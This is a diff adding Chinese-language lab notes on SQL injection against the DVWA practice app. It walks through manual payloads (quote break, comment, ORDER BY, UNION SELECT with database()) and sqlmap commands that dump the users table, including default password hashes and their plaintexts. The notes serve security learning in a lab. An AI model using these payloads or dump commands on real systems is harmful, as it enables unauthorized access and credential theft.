@@ -1,1 +1,95 @@
+  SQL注入是一种代码注入技术：攻击者通过在输入字段中插入恶意的SQL代码来欺骗后端数据库执行非预期的指令
+                            从而窃取，篡改和删除数据。
+SQL Injection
+DVMA靶场实验： User ID:      Submit
+  1.输入字段 1 ：
+       Request:GET /vulnerabilities/sqli/?id=1&Submit=Submit 
+       返回：ID: 1
+             First name: admin
+             Surname: admin
+     取得ID为1的用户信息
+  2.输入字段 1' ：
+       Request:GET /vulnerabilities/sqli/?id=1%27&Submit=Submit HTTP/1.1
+       返回：You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version 
+             for the right syntax to use near ''1''' at line 1
+     %27为 ' 的URL编码形式。 此时后台收到语句：SELRCT * FROM users WHERE id = '1'' 。双单引号导致检索语法错误。
+  3.输入字段 1'-- - ：
+       Request:GET /vulnerabilities/sqli/?id=1%27--+-&Submit=Submit HTTP/1.1
+       返回：ID: 1'-- -
+             First name: admin
+             Surname: admin
+     取得ID为1的用户信息。因为-- - 是SQL注释符，后面的内容被注释，所以输入'1'-- -'被检索为'1'，正常输出ID为1的用户信息。
+  4.输入字段 1' ORDER BY 1-- - 和1' ORDER BY 3-- - ：
+       Request:GET /vulnerabilities/sqli/?id=1%27+ORDER+BY+1--+-&Submit=Submit HTTP/1.1 
+       返回：BY1:ID: 1' ORDER BY 1-- -
+                 First name: admin
+                 Surname: admin
+             BY3:Unknown column '3' in 'order clause'
+     ORDER BY 为测试字段数，经过测试1，2正确输出，3报错，所以可知数据库字段数为2.
+  5.输入字段 1' UNION SELECT 1,2-- - ：
+       Request:GET /vulnerabilities/sqli/?id=1%27+UNION+SELECT+1%2C2--+-&Submit=Submit HTTP/1.1
+       返回：ID: 1' UNION SELECT 1,2-- -
+             First name: admin
+             Surname: admin
+
+             ID: 1' UNION SELECT 1,2-- -
+             First name: 1
+             Surname: 2
+     回显位：指页面中能够显示数据库返回数据的位置
+     延申：1' UNION SELECT 1,database()-- -
+      返回：ID: 1' UNION SELECT 1,database()-- -
+            First name: admin
+            Surname: admin
+
+            ID: 1' UNION SELECT 1,database()-- -
+            First name: 1
+            Surname: dvwa
+    database()为数据库名字，所以在第二个回显位上返回数据库的名字为dvwa。以此类推可以输入version获得数据库版本号，
+      user()输出数据库用户名
+  6.SQLMap自动化注入
+    步骤：1.找到之前抓到的 GET /vulnerabilities/sqli/?id=1&Submit=Submit 请求并保存为dvwa.txt到桌面上。
+            (dvwa.txt的作用：告诉SQLMap目标地址/携带Cookie（身份认证）/指定注入参数位置）
+          2.执行# SQLMap自动注入
+                sqlmap -r dvwa.txt --batch
+          3.执行操作：
+              获取所有数据库：sqlmap -r dvwa.txt --dbs --batch 
+                  结果：[04:29:14] [WARNING] reflective value(s) found and filtering out available databases [2]:
+                        [*] dvwa
+                        [*] information_schema
+              获取当前数据库的表：sqlmap -r dvwa.txt -D dvwa --tables --batch 
+                  结果：Database: dvwa[2 tables]
+                        +-----------+
+                        | guestbook |
+                        | users     |
+                        +-----------+
+              获取users表的列：Table: users
+                  结果：[8 columns]
+                        +--------------+-------------+ 
+                        | Column       | Type        |
+                        +--------------+-------------+
+                        | user         | varchar(15) |
+                        | avatar       | varchar(70) |
+                        | failed_login | int(3)      |
+                        | first_name   | varchar(15) |
+                        | last_login   | timestamp   |
+                        | last_name    | varchar(15) |
+                        | password     | varchar(32) |
+                        | user_id      | int(6)      |
+                        +--------------+-------------+
+              获取用户名密码：sqlmap -r dvwa.txt -D dvwa -T users -C user,password --dump --batch
+                        Database: dvwa   
+                        Table: users
+                        [5 entries]
+                        +---------+---------------------------------------------+
+                        | user    | password                                    |
+                        +---------+---------------------------------------------+
+                        | admin   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
+                        | gordonb | e99a18c428cb38d5f260853678922e03 (abc123)   |
+                        | 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  |
+                        | pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  |
+                        | smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
+                        +---------+---------------------------------------------+
+
+                            
+
 
